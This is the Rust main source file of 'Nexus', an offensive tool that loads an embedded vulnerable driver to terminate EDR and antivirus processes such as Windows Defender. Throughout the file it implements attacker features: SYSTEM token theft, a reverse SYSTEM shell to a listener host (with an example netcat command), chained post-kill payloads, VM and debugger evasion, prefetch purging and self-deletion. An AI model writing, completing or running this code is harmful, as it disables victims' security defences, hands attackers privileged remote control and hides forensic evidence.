mod config;
mod driver;
mod loader;
mod obf;
mod ops;
mod shell;
mod targets;
mod uac;

/// MonProcessEX.sys embedded at compile time — no external .sys file needed at runtime.
const DRIVER_BYTES: &[u8] = include_bytes!("../driver/MonProcessEX.sys");

use std::io::Write;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::{process, thread, time::Duration};

const EXIT_OK: i32 = 0;
const EXIT_NO_TARGET: i32 = 2;
const EXIT_DRIVER_FAIL: i32 = 3;
const EXIT_ENV: i32 = 5;

fn flush_and_exit(code: i32) -> ! {
    let _ = std::io::stdout().flush();
    process::exit(code);
}

struct Opts {
    silent: bool,
    repeat: bool,
    dry_run: bool,
    json: bool,
    list_mode: bool,
    version: bool,
    delay_ms: u64,
    jitter_ms: u64,
    max_attempts: u32,
    self_destruct: bool,
    skip_env_check: bool,
    service_name: Option<String>,
    driver_path: Option<String>,
    cli_names: Option<String>,
    cli_config: Option<String>,
    exec_cmd: Option<String>,
    exec_detach: bool,
    /// -H <LHOST>  listener host for the reverse SYSTEM shell
    shell_host: Option<String>,
    /// -P <LPORT>  listener port for the reverse SYSTEM shell
    shell_port: Option<String>,
    /// -c <COMMAND>  binary to spawn in the reverse shell (default: cmd.exe)
    shell_cmd: Option<String>,
}

fn parse_args() -> Option<Opts> {
    let args: Vec<String> = std::env::args().collect();
    let mut o = Opts {
        silent: false,
        repeat: false,
        dry_run: false,
        json: false,
        list_mode: false,
        version: false,
        delay_ms: 0,
        jitter_ms: 0,
        max_attempts: 0,
        self_destruct: false,
        skip_env_check: false,
        service_name: None,
        driver_path: None,
        cli_names: None,
        cli_config: None,
        exec_cmd: None,
        exec_detach: false,
        shell_host: None,
        shell_port: None,
        shell_cmd: None,
    };
    let mut i = 1;
    while i < args.len() {
        match args[i].as_str() {
            "-s" | "--silent" => o.silent = true,
            "-r" | "--repeat" => o.repeat = true,
            "-d" | "--dry-run" => o.dry_run = true,
            "-j" | "--json" => o.json = true,
            "-l" | "--list" => o.list_mode = true,
            "-v" | "--version" => o.version = true,
            "-x" | "--self-destruct" => o.self_destruct = true,
            "--no-check" => o.skip_env_check = true,
            "--delay" => { i += 1; if i < args.len() { o.delay_ms = args[i].parse().unwrap_or(0); } }
            "--jitter" => { i += 1; if i < args.len() { o.jitter_ms = args[i].parse().unwrap_or(0); } }
            "--max-attempts" => { i += 1; if i < args.len() { o.max_attempts = args[i].parse().unwrap_or(0); } }
            "--svc" | "--service-name" => { i += 1; if i < args.len() { o.service_name = Some(args[i].clone()); } }
            "--driver" => { i += 1; if i < args.len() { o.driver_path = Some(args[i].clone()); } }
            "-n" | "--names" => { i += 1; if i < args.len() { o.cli_names = Some(args[i].clone()); } }
            "--config" => { i += 1; if i < args.len() { o.cli_config = Some(args[i].clone()); } }
            "-e" | "--exec" | "--post-exec" => {
                i += 1;
                if i < args.len() {
                    o.exec_cmd = Some(args[i].clone());
                }
            }
            "--detach" | "--exec-detach" => o.exec_detach = true,
            // ── Reverse SYSTEM shell (netcat-style) ───────────────────────
            "-H" | "--lhost" => { i += 1; if i < args.len() { o.shell_host = Some(args[i].clone()); } }
            "-P" | "--lport" => { i += 1; if i < args.len() { o.shell_port = Some(args[i].clone()); } }
            "-c" | "--shell-cmd" => { i += 1; if i < args.len() { o.shell_cmd = Some(args[i].clone()); } }
            "-h" | "--help" => { print_help(); return None; }
            _ => {}
        }
        i += 1;
    }
    Some(o)
}

fn print_help() {
    println!("Nexus - MonProcessEX.sys EDR process terminator");
    println!("Cross-version, all Windows 10 and Windows 11 builds.");
    println!();
    println!("usage: nexus.exe [options]");
    println!();
    println!("options:");
    println!("  -s, --silent           suppress all console output");
    println!("  -r, --repeat           keep running, re-check targets");
    println!("  -d, --dry-run          enumerate targets without killing");
    println!("  -j, --json             machine-readable JSON output");
    println!("  -l, --list             print target names and exit");
    println!("  -v, --version          print version and exit");
    println!("  -x, --self-destruct    delete self after success");
    println!("      --no-check         skip VM and debugger checks");
    println!("      --delay <ms>       sleep before executing");
    println!("      --jitter <ms>      randomize repeat interval");
    println!("      --max-attempts <n> stop after n kill passes");
    println!("      --svc <name>       custom service name");
    println!("      --driver <path>    custom driver file path");
    println!("  -n, --names <csv>      comma-separated target list");
    println!("      --config <path>    load targets from config file");
    println!("  -e, --exec <cmd>       execute command/payload after killing targets");
    println!("      --detach           run post-kill payload in detached background");
    println!();
    println!("reverse shell (NT AUTHORITY\\SYSTEM):");
    println!("  -H, --lhost <host>     listener host / attacker IP");
    println!("  -P, --lport <port>     listener port");
    println!("  -c, --shell-cmd <cmd>  binary to execute (default: cmd.exe)");
    println!();
    println!("  example:  nexus.exe -n \"MsMpEng.exe\" -H 192.168.1.10 -P 4444 -c cmd.exe");
    println!("  listener: nc -lvnp 4444");
    println!();
    println!("  -h, --help             show this help");
    println!();
    println!("exit codes: 0 ok, 2 no targets, 3 driver failed, 5 environment");
    println!("targets from: --names > --config > targets.conf > built-in defaults");
}

fn main() {
    let opts = match parse_args() {
        Some(o) => o,
        None => return,
    };

    if opts.version {
        println!("Nexus v0.1.0");
        println!("MonProcessEX.sys cross-version EDR process terminator");
        return;
    }

    let (names_str, cfg_exec) = if let Some(n) = &opts.cli_names {
        (config::parse_names_csv(n), None)
    } else if let Some(path) = &opts.cli_config {
        if let Some(cfg) = config::load_config_file(path) {
            (cfg.targets, cfg.post_exec)
        } else {
            (Vec::new(), None)
        }
    } else if let Some(cfg) = config::load_config_file(config::DEFAULT_CONF) {
        let tgts = if !cfg.targets.is_empty() { cfg.targets } else { targets::defaults() };
        (tgts, cfg.post_exec)
    } else {
        (targets::defaults(), None)
    };

    let target_exec_cmd = opts.exec_cmd.clone().or(cfg_exec);

    if opts.list_mode {
        println!("targets: {}", names_str.len());
        for n in &names_str { println!("  {n}"); }
        if let Some(ref cmd) = target_exec_cmd {
            println!("post-exec payload: {cmd}");
        }
        return;
    }

    // Ensure we are running at high integrity before touching the driver/SCM.
    uac::ensure_elevated();

    if opts.silent {
        let _ = unsafe { driver::silence_std_handles() };
    }

    if opts.delay_ms > 0 {
        std::thread::sleep(Duration::from_millis(opts.delay_ms));
    }


    if names_str.is_empty() {
        println!("error: no target names specified");
        flush_and_exit(EXIT_NO_TARGET);
    }

    if !opts.skip_env_check {
        if ops::detect_debugger() || ops::detect_vm() {
            println!("aborted: analysis environment detected");
            flush_and_exit(EXIT_ENV);
        }
    }

    let _mutex = match ops::create_mutex(&obf::mutex_name()) {
        Some(m) => m,
        None => {
            println!("error: another instance is already running");
            flush_and_exit(1);
        }
    };

    // If --driver was supplied use it directly; otherwise extract the embedded driver to %TEMP%.
    let _temp_driver: Option<ops::TempDriver>;
    let drv_file = if let Some(ref path) = opts.driver_path {
        _temp_driver = None;
        ops::resolve_driver_path(path)
    } else {
        let td = ops::drop_embedded_driver(DRIVER_BYTES)
            .unwrap_or_else(|e| { println!("fatal: {e}"); flush_and_exit(EXIT_DRIVER_FAIL); });
        let p = td.path().to_string();
        _temp_driver = Some(td);
        p
    };

    let svc_name = opts.service_name.clone().unwrap_or_else(ops::random_service_name);

    let mut _drv_svc: Option<loader::DriverService> = None;
    let dev = match driver::NexusDev::open() {
        Ok(d) => {
            println!("[+] driver already loaded");
            d
        }
        Err(_) => {
            let svc = loader::DriverService::install(&svc_name, &drv_file)
                .unwrap_or_else(|e| { println!("fatal: {e}"); flush_and_exit(EXIT_DRIVER_FAIL); });
            svc.start().unwrap_or_else(|e| { println!("fatal: {e}"); flush_and_exit(EXIT_DRIVER_FAIL); });
            let d = driver::NexusDev::open().unwrap_or_else(|e| { println!("fatal: {e}"); flush_and_exit(EXIT_DRIVER_FAIL); });
            println!("[+] driver loaded");
            _drv_svc = Some(svc);
            d
        }
    };

    if opts.dry_run {
        let procs = targets::find_running(&names_str.iter().map(|s| s.as_str()).collect::<Vec<&str>>());
        if opts.json {
            let exec_json = match &target_exec_cmd {
                Some(c) => format!("\"{}\"", c.replace('\\', "\\\\").replace('"', "\\\"")),
                None => "null".to_string(),
            };
            println!("{{\"mode\":\"dry-run\",\"targets\":[{}],\"post_exec\":{exec_json}}}", procs.iter().map(|(n, p)| format!("{{\"name\":\"{n}\",\"pid\":{p}}}")).collect::<Vec<_>>().join(","));
        } else {
            println!("dry-run: {} target(s) present", procs.len());
            for (n, p) in &procs { println!("  {n} ({p})"); }
            if let Some(ref cmd) = target_exec_cmd {
                println!("dry-run: post-exec payload queued: {cmd}");
            }
        }
        drop(dev);
        flush_and_exit(if procs.is_empty() { EXIT_NO_TARGET } else { EXIT_OK });
    }

    // ── Kill loop ─────────────────────────────────────────────────────────────
    // When a reverse shell is requested, run the kill loop concurrently in a
    // background thread so targets stay dead for the entire shell session.
    // Otherwise run it inline as before.
    let shell_requested = opts.shell_host.is_some();

    if shell_requested {
        // Background kill thread: keeps looping until shell session closes.
        let stop_kill  = Arc::new(AtomicBool::new(false));
        let stop_kill2 = stop_kill.clone();
        let names_bg   = names_str.clone();
        // --jitter sets the kill interval; default to 500 ms if not specified.
        let interval_bg = if opts.jitter_ms > 0 { opts.jitter_ms } else { 500 };
        let max_bg      = opts.max_attempts; // 0 = infinite

        let kill_thread = thread::spawn(move || {
            let mut pass: u32 = 0;
            while !stop_kill2.load(Ordering::SeqCst) {
                // Open a fresh handle each pass (driver stays loaded via _drv_svc).
                if let Ok(dev2) = driver::NexusDev::open() {
                    let procs = targets::find_running(
                        &names_bg.iter().map(|s| s.as_str()).collect::<Vec<&str>>(),
                    );
                    for (name, pid) in &procs {
                        match dev2.kill_pid(*pid) {
                            Ok(()) => println!("(+) [bg] terminated {name} ({pid})"),
                            Err(e) => println!("error: [bg] {name} ({pid}): {e}"),
                        }
                    }
                }
                pass += 1;
                if max_bg > 0 && pass >= max_bg {
                    break;
                }
                thread::sleep(Duration::from_millis(interval_bg));
            }
        });

        // Close main dev handle (thread has its own) but keep service alive.
        drop(dev);

        // ── Post-kill payload ─────────────────────────────────────────────
        if let Some(ref cmd) = target_exec_cmd {
            if let Err(e) = ops::execute_payload(cmd, opts.exec_detach) {
                println!("error: post-kill payload failed: {e}");
            }
        }

        // ── Reverse SYSTEM shell ──────────────────────────────────────────
        let host     = opts.shell_host.as_deref().unwrap_or("");
        let port_str = opts.shell_port.as_deref().unwrap_or("");
        let shell_bin = opts.shell_cmd.as_deref().unwrap_or("cmd.exe");
        match port_str.parse::<u16>() {
            Ok(port) => {
                match shell::steal_system_token() {
                    Ok(tok) => {
                        if let Err(e) = shell::reverse_shell(host, port, shell_bin, tok) {
                            println!("error: shell: {e}");
                        }
                        unsafe { let _ = windows::Win32::Foundation::CloseHandle(tok); }
                    }
                    Err(e) => println!("error: token theft: {e}"),
                }
            }
            Err(_) => println!("error: -P: missing or invalid port (got '{port_str}')"),
        }

        // Shell closed — stop kill thread and tear down driver.
        stop_kill.store(true, Ordering::SeqCst);
        let _ = kill_thread.join();
        drop(_drv_svc);
        drop(_temp_driver);

    } else {
        // ── Inline kill loop (no shell) ───────────────────────────────────
        let stop = AtomicBool::new(false);
        let mut attempt: u32 = 0;
        let mut total_killed = 0usize;

        loop {
            attempt += 1;
            let procs = targets::find_running(&names_str.iter().map(|s| s.as_str()).collect::<Vec<&str>>());
            let mut killed = 0usize;

            for (name, pid) in &procs {
                match dev.kill_pid(*pid) {
                    Ok(()) => {
                        killed += 1;
                        println!("(+) terminated {name} ({pid})");
                    }
                    Err(e) => {
                        println!("error: {name} ({pid}): {e}");
                    }
                }
            }
            total_killed += killed;

            if !opts.repeat || (opts.max_attempts > 0 && attempt >= opts.max_attempts) { break; }
            ops::jitter_sleep(3000, opts.jitter_ms);
            if stop.load(Ordering::SeqCst) { break; }
        }

        // Clean up driver handles and service before running post-kill payload
        drop(dev);
        drop(_drv_svc);
        drop(_temp_driver);

        // Execute chained payload/service (e.g. RustPotato)
        if let Some(ref cmd) = target_exec_cmd {
            if let Err(e) = ops::execute_payload(cmd, opts.exec_detach) {
                println!("error: post-kill payload failed: {e}");
            }
        }


        if opts.self_destruct {
            if let Ok(exe) = std::env::current_exe() {
                ops::purge_prefetch();
                ops::self_destruct(&exe.to_string_lossy());
            }
        }

        flush_and_exit(if total_killed > 0 || target_exec_cmd.is_some() { EXIT_OK } else { EXIT_NO_TARGET });
    }

    if opts.self_destruct {
        if let Ok(exe) = std::env::current_exe() {
            ops::purge_prefetch();
            ops::self_destruct(&exe.to_string_lossy());
        }
    }

    flush_and_exit(EXIT_OK);
}
